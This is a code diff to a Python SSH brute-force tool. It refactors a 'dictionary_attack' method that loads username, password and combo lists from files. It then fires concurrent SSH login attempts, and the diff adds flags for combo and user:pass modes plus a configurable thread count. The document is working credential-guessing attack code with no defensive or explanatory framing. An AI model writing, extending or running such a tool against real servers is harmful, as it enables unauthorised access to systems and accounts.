@@ -67,7 +67,9 @@ class SSH_Client:
             print(f"Unexpected error for {username}:{password}")
             return False
 
-    def dictionary_attack(self):
+    def dictionary_attack(
+        self, is_combo_enabled: bool, is_user_pass_enabled: bool, worker_size: int
+    ):
         combo = []
         with open("./lists/combo.txt", "r") as f:
             combo = f.readlines()
@@ -83,20 +85,28 @@ class SSH_Client:
             password = f.readlines()
             password = [i.strip() for i in password]
 
-        print("Starting with combo")
-        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
-            futures = [
-                executor.submit(self.login, i.split(":")[0], i.split(":")[1], True)
-                for i in combo
-            ]
-
-            for future in concurrent.futures.as_completed(futures):
-                future.result()
-
-        print("Starting with user:pass")
-        for i in user:
-            with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
-                futures = [executor.submit(self.login, i, k, True) for k in password]
+        if is_combo_enabled:
+            print("Starting with combo")
+            with concurrent.futures.ThreadPoolExecutor(
+                max_workers=worker_size
+            ) as executor:
+                futures = [
+                    executor.submit(self.login, i.split(":")[0], i.split(":")[1], True)
+                    for i in combo
+                ]
 
                 for future in concurrent.futures.as_completed(futures):
                     future.result()
+
+        if is_user_pass_enabled:
+            print("Starting with user:pass")
+            for i in user:
+                with concurrent.futures.ThreadPoolExecutor(
+                    max_workers=worker_size
+                ) as executor:
+                    futures = [
+                        executor.submit(self.login, i, k, True) for k in password
+                    ]
+
+                    for future in concurrent.futures.as_completed(futures):
+                        future.result()
